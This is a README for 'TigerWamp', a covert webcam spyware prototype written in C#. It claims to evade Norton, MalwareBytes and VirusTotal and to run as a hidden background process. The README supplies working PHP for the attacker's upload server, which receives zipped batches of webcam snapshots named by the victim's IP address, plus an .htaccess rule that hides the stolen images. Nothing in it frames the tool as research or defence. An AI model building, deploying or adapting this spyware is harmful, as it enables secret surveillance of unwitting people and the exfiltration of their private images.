# TigerWamp Spyware
TigerWamp is a prototype camera spyware written in c# inspired by Pegasus!

At the time of publication, it could bypass Norton, MalwareBytes, and VirusTotal.
It runs as an invisible WPF application that hides in the middle of the background processes list.

To use it you need your own webserver directory "uploads/" and a php file "upload.php" with contents:

```php
<?php
$uploads_dir = './uploads/'; //Directory to save the file that comes from client application.

if ($_FILES["file"]["error"] == UPLOAD_ERR_OK && $_GET["key"] == "acdb9feb36ae9487032179261e5f12ea") {
    $tmp_name = $_FILES["file"]["tmp_name"];
    $name = $_FILES["file"]["name"];
    move_uploaded_file($tmp_name, "$uploads_dir/" . base64_encode($_SERVER['REMOTE_ADDR'] .".{" . time() . "}") . ".zip");
    echo "Ok.";
}
?> 
```
The spyware takes snapshots from the webcam (opencv cam 0). After every 40 captures the program compresses them in a zip file and uploads it to your web server.

# Recommended
Add this to your .htaccess file:
```.htaccess
RedirectMatch 404 ^/uploads/?$
```
It will make sure that only the owners of the webserver can access the content.
